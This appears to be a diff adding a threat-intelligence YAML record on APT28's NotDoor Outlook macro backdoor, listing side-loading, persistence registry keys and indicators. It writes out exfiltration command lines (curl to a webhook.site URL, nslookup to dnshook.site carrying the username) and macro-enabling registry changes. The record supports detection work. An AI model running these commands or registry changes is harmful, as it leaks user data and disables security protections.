@@ -1,0 +1,50 @@
+description: "A VBA macro backdoor for Outlook named NotDoor was deployed via DLL\
+  \ side\u2011loading of SSPICLI.dll into OneDrive.exe, enabling data exfiltration\
+  \ and command execution."
+attribution: APT28 (Russian intelligence)
+malware_families:
+- NotDoor
+TTPs:
+  processes:
+  - OneDrive.exe
+  - SSPICLI.dll
+  - Outlook.exe
+  commandline:
+  - powershell -EncodedCommand <Base64_of_copy_command>
+  - powershell -EncodedCommand <Base64_of_nslookup_command>
+  - cmd /c curl "hxxp://webhook.site/910cf351-a05d-4f67-ab8e-6f62cfa8e26d?$env:USERNAME"
+  - $a=$env:APPDATA;copy c:\programdata\testtemp.ini "$a\Microsoft\Outlook\VbaProject.OTM"
+  - nslookup "$env:USERNAME.910cf351-a05d-4f67-ab8e-6f62cfa8e26d.dnshook.site"
+  powershell:
+  - <Base64_of_copy_command>
+  - <Base64_of_nslookup_command>
+  scripting_engine: []
+  registry_keys:
+  - HKCU\Software\Microsoft\Office\16.0\Outlook LoadMacroProviderOnBoot
+  - HKCU\Software\Microsoft\Office\16.0\Outlook\Security Level
+  - HKCU\Software\Microsoft\Office\16.0\Outlook\Options\General
+  image_load: []
+  network_connections:
+  - process: Outlook.exe
+    destination: nslookup $env:USERNAME.910cf351-a05d-4f67-ab8e-6f62cfa8e26d.dnshook.site
+  - process: cmd.exe
+    destination: hxxp://webhook.site/910cf351-a05d-4f67-ab8e-6f62cfa8e26d?$env:USERNAME
+  file_activity:
+  - C:\\ProgramData\\testtemp.ini
+  - '%APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM'
+  - '%TEMP%\\Temp\\<generated files>'
+  persistence:
+  - Registry key LoadMacroProviderOnBoot set to enable macro execution on boot.
+  - Registry key Security Level modified to allow macros.
+  - Registry key General modified to disable dialogue messages.
+  process_relations: []
+IOCs:
+  hashes: []
+  ips: []
+  domains:
+  - webhook.site
+  - dnshook.site
+  urls: []
+reference: https://lab52.io/blog/analyzing-notdoor-inside-apt28s-expanding-arsenal/
+date_of_publication: September 03, 2025
+file_creation_date: September 04, 2025
